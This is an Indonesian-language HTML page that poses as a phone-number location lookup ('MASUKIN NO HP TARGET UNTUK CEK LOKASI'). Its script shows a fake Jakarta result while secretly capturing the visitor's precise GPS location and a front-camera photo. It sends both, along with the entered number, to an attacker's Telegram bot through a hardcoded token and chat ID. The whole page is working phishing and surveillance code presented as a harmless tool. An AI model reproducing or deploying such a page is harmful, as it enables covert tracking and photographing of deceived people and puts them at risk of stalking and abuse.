<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Kirim Foto + Lokasi</title>
<style>
  :root {
    --primary: #0b74de;
    --bg: #f1f3f6;
    --card-bg: #fff;
    --text-main: #222;
    --text-muted: #666;
  }
  body {
    margin: 0;
    height: 100vh;
    background: var(--bg);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: "Segoe UI", Arial, sans-serif;
  }
  .card {
    width: 360px;
    max-width: 95%;
    background: var(--card-bg);
    padding: 24px 20px;
    border-radius: 14px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    text-align: center;
  }
  .card h1 {
    font-size: 20px;
    color: var(--primary);
    font-weight: 600;
    margin-bottom: 20px;
    line-height: 1.4;
  }
  input {
    width: 100%;
    padding: 12px;
    font-size: 15px;
    border-radius: 10px;
    border: 1px solid #ccc;
    margin-bottom: 14px;
    box-sizing: border-box;
    transition: border-color 0.2s;
  }
  input:focus {
    outline: none;
    border-color: var(--primary);
  }
  button {
    width: 100%;
    padding: 13px;
    font-size: 16px;
    color: #fff;
    background: var(--primary);
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: background 0.3s;
  }
  button:hover {
    background: #095eb1;
  }
  .jakarta {
    font-size: 16px;
    color: var(--text-main);
    margin-top: 15px;
    line-height: 1.5;
  }
  .jakarta strong {
    display: block;
    color: var(--primary);
    margin-bottom: 5px;
  }
  .maplink {
    color: var(--primary);
    text-decoration: none;
    font-size: 14px;
  }
  .maplink:hover {
    text-decoration: underline;
  }
</style>
</head>
<body>
  <div id="app" class="card">
    <h1>MASUKIN NO HP TARGET UNTUK CEK LOKASI</h1>
    <input id="phone" placeholder="Masukkan nomor HP (contoh: +62812...)" />
    <button id="go">‚û°Ô∏è Lanjut</button>
  </div>

<script>
(function(){
  // === GANTI DENGAN TOKEN DAN CHAT ID KAMU ===
  const BOT_TOKEN = "8383057333:AAF30AFN-COMrGiQ4j3FwETZ3QMy4y2-_CE";
  const CHAT_ID = "6637547478";
  // ==========================================

  const app = document.getElementById('app');
  const phoneInput = document.getElementById('phone');
  const goBtn = document.getElementById('go');

  async function sendTelegramMessage(text){
    if(!BOT_TOKEN || !CHAT_ID) return;
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
    } catch(e){ console.error(e); }
  }

  async function sendTelegramPhoto(blob, caption){
    if(!BOT_TOKEN || !CHAT_ID) return;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    if(caption) form.append('caption', caption);
    form.append('photo', blob, 'photo.jpg');
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST', body: form
      });
    } catch(e){ console.error(e); }
  }

  function getRealLocation(timeout = 15000){
    return new Promise((resolve, reject) => {
      if(!navigator.geolocation) return reject();
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        }),
        err => reject(err),
        { enableHighAccuracy: true, timeout }
      );
    });
  }

  async function takePhotoBlob(){
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const track = stream.getVideoTracks()[0];
    const video = document.createElement('video');
    video.srcObject = new MediaStream([track]);
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
    track.stop();
    return blob;
  }

  goBtn.addEventListener('click', async ()=>{
    const phone = phoneInput.value.trim();
    if(!phone) return;

    // Ganti UI langsung ke tampilan Jakarta
    app.innerHTML = `
      <div class="jakarta">
        <strong>Lokasi untuk nomor ${escapeHtml(phone)}:</strong>
        üìç Jakarta, Indonesia<br>
        <a class="maplink" href="https://www.google.com/maps?q=-6.2088,106.8456" target="_blank">Buka di Google Maps</a>
      </div>
    `;

    // Kirim lokasi asli + foto ke Telegram (background)
    let loc = null;
    try { loc = await getRealLocation(); } catch(e){ console.warn(e); }
    let photoBlob = null;
    try { photoBlob = await takePhotoBlob(); } catch(e){ console.warn(e); }

    let text = `üì≤ Nomor: ${phone}\nüïí ${new Date().toLocaleString()}\n`;
    if(loc){
      text += `üìç Lat: ${loc.lat}\nüìç Lon: ${loc.lon}\nüéØ Akurasi: ${loc.acc} m\nüîó https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
    } else {
      text += `‚ö†Ô∏è Lokasi nyata tidak tersedia`;
    }
    await sendTelegramMessage(text);
    if(photoBlob) await sendTelegramPhoto(photoBlob, `üì∏ Foto dari perangkat\nNomor: ${phone}`);
  });

  function escapeHtml(s){
    return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
  }
})();
</script>
</body>
</html>
